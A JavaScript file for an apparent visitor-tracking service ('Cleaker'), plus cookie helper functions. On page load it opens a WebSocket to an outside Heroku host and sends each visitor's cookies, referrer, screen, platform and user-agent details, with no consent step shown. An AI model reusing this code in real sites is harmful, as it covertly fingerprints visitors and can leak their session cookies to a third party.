//- EVoL.VE
$('document').ready(function(){
		//SET DATA READY	
		//USE URL WS:// OR WSS:// (IF USING TLS)
		var ws = new WebSocket("wss://monadlisa.herokuapp.com");
		//var ws = new WebSocket("ws://localhost:5000"); //RUNNING LOCAL
			ws.onopen = function(e){
			//console.log('Conected to MonadLisa.'); //ON STAGE
			console.log('Conected to Cleaker. 000');
					}
					
		//most important part - incoming messages
		ws.onmessage = function(message) {
		 //parse JSON message. Server always returns JSON
		 //Works without any problem but we should make sure that
		 //the message is not chunked or otherwise damaged.
		 	 try {
				  var ws_msg = JSON.parse(message.data);
				  } catch (e) {
				    console.log('Not a valid JSON: ', message.data);
				    return;
				     }
		 	 //RECEVING JSON.TYPE FROM INDEX
			 if (ws_msg.type === 'cleaking'){ //first handshake with cleaker index
				 var myUUID = ws_msg.uuid; //ID' the connection record
				 var cleaker ={    
					 uuid: myUUID,
					 onDate: new Date(),
					 timezone:(new Date()).getTimezoneOffset()/60,
					 locationPath: window.location.pathname,
					 locationOrigin: location.origin,
					 referrer: document.referrer,
					 screenHeight: window.screen.height,
					 screenWidth: window.screen.width,
					 language: navigator.language,
					 platform: navigator.platform,
					 cookies: document.cookie,
					 userAgent: navigator.userAgent,
					 webDriver: navigator.webdriver //interface indicates whether the user agent is controlled by automation.
					 //OTHER ADITIONAL DATA THAT COULD BE RECOLLECTED
					 //geolocation: navigator.geolocation
					 //browserOnline: navigator.onLine,
					 //sessionClosed: 'I am',
					 //sessionDuration:'00:00:00',//tdyvisits: 0,
					 //ystvisits: 'x',
					 //wklyVisits: 'x',
					 //historyLength: history.length,
					 //mnthlyVisits: 'x',
					 //usrname: 'usrname',
					 //pushNotifications: 'yes',
					 //returningVisitor: "no",
					 //js: navigator.javaEnabled(),
					 //connectionSpeed: navigator.connectionSpeed,
					 //cookiesEnabled: navigator.cookieEnabled,
				 };
				 //var cookieCleaker = JSON.stringify(cleaker);
				 //createCookie('cleakerCookie', cookieCleaker, 21);
				 ws.send(JSON.stringify({clkcd: 'cleaked' , cleaker: cleaker}));
			 }
		 }
	}); // DOCUMENT ON READY

	 /*
	 neutonsartntec
	     								 .-. .-')             ('-.    .-')    
	                                      \  ( OO )          _(  OO)  ( OO ).  
	    .-----.  .-'),-----.  .-'),-----. ,--. ,--.  ,-.-') (,------.(_)---\_) 
	   '  .--./ ( OO'  .-.  '( OO'  .-.  '|  .'   /  |  |OO) |  .---'/    _ |  
	   |  |('-. /   |  | |  |/   |  | |  ||      /,  |  |  \ |  |    \  :` `.  
	  /_) |OO  )\_) |  |\|  |\_) |  |\|  ||     ' _) |  |(_/(|  '--.  '..`''.) 
	  ||  |`-'|   \ |  | |  |  \ |  | |  ||  .   \  ,|  |_.' |  .--' .-._)   \ 
	 (_'  '--'\    `'  '-'  '   `'  '-'  '|  |\   \(_|  |    |  `---.\       / 
	    `-----'      `-----'      `-----' `--' '--'  `--'    `------' `-----' 
	 we get to remember;
	 */
	 function createCookie(name, value,days) {
	 	  if (days) {
	 	  	var date = new Date();
	 	  		date.setTime(date.getTime()+(days*24*60*60*1000));
	 	  		var expires = "; expires="+date.toGMTString();
	 			}
	 	  	else var expires = "";
	 	  	document.cookie = name+"="+value+expires+"; path=/";
	 	  }
	 	  function readCookie(name) {
	 	  	var nameEQ = name + "=";
	 	  	var ca = document.cookie.split(';');
	 	  	for(var i=0;i < ca.length;i++) {
	 	  		var c = ca[i];
	 	  		while (c.charAt(0)==' ') c = c.substring(1,c.length);
	 	  		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
	 	  	}
	 	  	return null;
	 	  }
	 	  function eraseCookie(name) {
	 	  	createCookie(name,"",-1);
	 	  }
	 	  /*When calling createCookie() you have to give it three bits of information: the name and value of the cookie 
	 	  and the number of days it is to remain active. In this case the name-value pair should become 
	 	  ppkcookie=testcookie and it should be active for 7 days.*/
	 	  createCookie('cleakerCookie', "clkr", 21);
	 	  /*If you set the number of days to 0 
	 	  the cookie is trashed when the user closes the browser. 
	 	  If you set the days to a negative number the cookie is trashed immediately.
	 	  READCOOKIES
	 	  */
	 	  var x = readCookie('clkrCk');
	 	  if (x) {
	 		  alert("Reading Cookie: " + x);
	 	  }
								
					
		  	
					
			
